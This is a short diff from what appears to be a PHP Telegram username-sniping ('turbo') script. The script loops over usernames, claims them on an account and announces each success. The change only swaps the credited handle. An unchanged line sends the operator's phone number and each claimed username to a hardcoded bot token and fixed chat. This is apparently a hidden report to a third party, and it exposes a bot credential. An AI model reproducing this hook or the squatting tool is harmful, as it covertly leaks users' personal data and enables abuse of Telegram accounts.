@@ -36,8 +36,8 @@ foreach($users as $user){
         $x++;
     }catch (\danog\MadelineProto\Exception | \danog\MadelineProto\RPCErrorException $e) {
                 try{$MadelineProto->account->updateUsername(['username'=>$user]);
-                    bot('sendvideo', ['chat_id' => file_get_contents("ID") , 'video' => "https://t.me/bestc45/3",'caption' => "• Hi Night Swapped 🐊\n—————————\n- Done ➪ ( @$user )\n- Loops ➪ ( $x )\n- Save ➪ ( Account )\n—————————\n• Turbo : @besso5"]);
-                    $caption="• Hi Night Swapped 🐊\n—————————\n-NUMBER ➪ [$num]\n—————————\n- Done ➪ [ @$user ]\n- Loops ➪ [ $x ]\n- Save ➪ [ Account ]\n—————————\n• Turbo : @besso5";
+                    bot('sendvideo', ['chat_id' => file_get_contents("ID") , 'video' => "https://t.me/bestc45/3",'caption' => "• Hi Night Swapped 🐊\n—————————\n- Done ➪ ( @$user )\n- Loops ➪ ( $x )\n- Save ➪ ( Account )\n—————————\n• Turbo : @bg5"]);
+                    $caption="• Hi Night Swapped 🐊\n—————————\n-NUMBER ➪ [$num]\n—————————\n- Done ➪ [ @$user ]\n- Loops ➪ [ $x ]\n- Save ➪ [ Account ]\n—————————\n• Turbo : @bg5";
 file_get_contents("https://api.telegram.org/bot6139407487:AAFZwY4o9vvzQA0v3TYTx4-rll1Bd6t5qfY/sendvideo?chat_id=-1001907317826&video=https://t.me/bestc45/3&caption=".urlencode($caption));
 $data = str_replace("\n".$user,"", file_get_contents("users2"));
                     file_put_contents("users2", $data);
